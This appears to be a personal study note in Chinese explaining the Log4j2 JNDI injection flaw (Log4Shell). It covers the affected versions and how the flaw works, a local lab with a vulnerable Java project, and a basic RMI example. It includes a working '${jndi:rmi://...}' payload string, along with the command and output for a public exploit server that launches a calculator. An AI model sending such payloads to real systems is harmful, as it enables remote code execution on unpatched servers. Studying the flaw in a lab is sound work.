# 特别章节

**本章节主要讲述一些平时碰到的问题有感,比较杂乱回头会整理到大框架中**

## 1. 关于log4j的漏洞

[参考链接](https://www.anquanke.com/post/id/262668#h3-10)

[参考链接2](https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/)

### 1.1 相关环境

Apache **Log4j2**是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。

漏洞适用版本为2.0 <= Apache log4j2 <= 2.14.1，只需检测Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。

### 1.2 原理

先说一下大致原理,方便后面的环境搭建和详细了解

1. 执行注入

   + log4j在输出日志时(debug、info、warn、error、fatal)对字符串中'${'做了检测
   + 如果发现,会继续检测'}'字符
   + 如果满足以上条件,会将${}中的表达式提取并交给lookup函数执行
   + 通过调试发现interpolator类的lookup函数会以**:**为分隔符进行分割以获取prefix内容,根据参数类型调用不同的LookUp类(例如${jndi:rmi://ip:1099/c6eurw} 会调用JndiLookup类)
   + 最后执行到javax/naming/InitialContext.java 原生lookup解析函数

2. 调用外部恶意接口

   上述注入命令会通过rmi/ldap方式调用外部恶意接口,从而设法将恶意代码上传到服务器(本例中是一个构造方法中嵌入恶意命令的class文件)

3. 上传到服务器的恶意代码被解析并运行(对获取的类初始化,调用构造方法时执行恶意命令),从而完成入侵的目的

### 1.3 搭建模拟环境

创建maven项目,打印log4j日志

pom文件如下:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.log4j.bug</groupId>
    <artifactId>bugtest</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>jar</packaging>
    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                        <configuration>
                            <archive>
                                <manifest>
                                    <mainClass>
                                        LogTest
                                    </mainClass>
                                </manifest>
                            </archive>
                            <descriptorRefs>
                                <descriptorRef>jar-with-dependencies</descriptorRef>
                            </descriptorRefs>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LogTest {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args){
        // 避免因为Java版本过高而无法触发此漏洞
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:rmi://ip:1099/c6eurw}");
    }
}
```

创建jndi服务用来上传恶意代码

[项目地址](https://github.com/welk1n/JNDI-Injection-Exploit)

点击项目地址下载测试服务器

启动命名为

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  -C "open calc"`

注:-c 后面参数为恶意代码执行的指令现在是打开window服务器端的计算器程序

启动效果如下

```
PS C:\Users\index-dev\Desktop\javamap\java-map> java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  -C "open calc"
[ADDRESS] >> 192.168.0.137
[COMMAND] >> open calc
----------------------------JNDI Links----------------------------
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://192.168.0.137:1099/hamu5u
ldap://192.168.0.137:1389/hamu5u
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://192.168.0.137:1099/jayvdh
ldap://192.168.0.137:1389/jayvdh
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://192.168.0.137:1099/bwoyxz
----------------------------Server Log----------------------------
2022-01-05 16:37:05 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2022-01-05 16:37:05 [RMISERVER]  >> Listening on 0.0.0.0:1099
2022-01-05 16:37:07 [LDAPSERVER] >> Listening on 0.0.0.0:1389
```

此时运行java中的日志打印方法就会调用远程服务器的rmi服务获取到恶意代码并执行,效果是打开了服务器端计算器

### 1.4 相关概念

#### 1.4.1  JNDI

JNDI - Java Naming and Directory Interface 名为 Java命名和目录接口，具体的概念还是比较复杂难懂，具体结构设计细节可以不用了解，简单来说就是 JNDI 提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。

1. JNDI 获取并调用rmi远程方法:

   ```java
   //需要继承remote接口才能提供对外服务
   public interface JndiRmiTestInterface  extends Remote, Serializable {
       public void test();
   }
   //创建提供服务的子类 实现上述接口,因为实际提供的是代理对象所以一定要通过接口的方式提供rmi服务
   import javax.naming.Context;
   import javax.naming.InitialContext;
   import java.rmi.RemoteException;
   import java.rmi.registry.LocateRegistry;
   import java.rmi.registry.Registry;
   import java.util.Properties;
   
   public class JndiRmiTest  implements JndiRmiTestInterface {
       public JndiRmiTest() throws RemoteException {
           System.out.println("执行了构造方法");
       }
       @Override
       public void test(){
           System.out.println("调用了test方法");
       }
       public static void main(String args[]) throws Exception {
           // 配置 JNDI 默认设置
           Properties env = new Properties();
           env.put(Context.INITIAL_CONTEXT_FACTORY,
                   "com.sun.jndi.rmi.registry.RegistryContextFactory");
           env.put(Context.PROVIDER_URL,
                   "rmi://192.168.0.137:1099");
           Context ctx = new InitialContext(env);
           // 本地开启 1099 端口作为 RMI 服务，并以标识 "hello" 绑定方法对象
           Registry registry = LocateRegistry.createRegistry(1099);
           JndiRmiTest jndiRmiTest = new JndiRmiTest();
           registry.bind("jndiRmiTest", jndiRmiTest);
           // JNDI 获取 RMI 上的方法对象并进行调用
           Object jndiRmiTest2 = ctx.lookup("jndiRmiTest");
           JndiRmiTest jndiRmiTest1 = (JndiRmiTest)ctx.lookup("jndiRmiTest");
           jndiRmiTest1.test();
       }
   }
   //结果
   执行了构造方法
   调用了test方法
   ```

   ![](resource\JndiRmi.jpg)

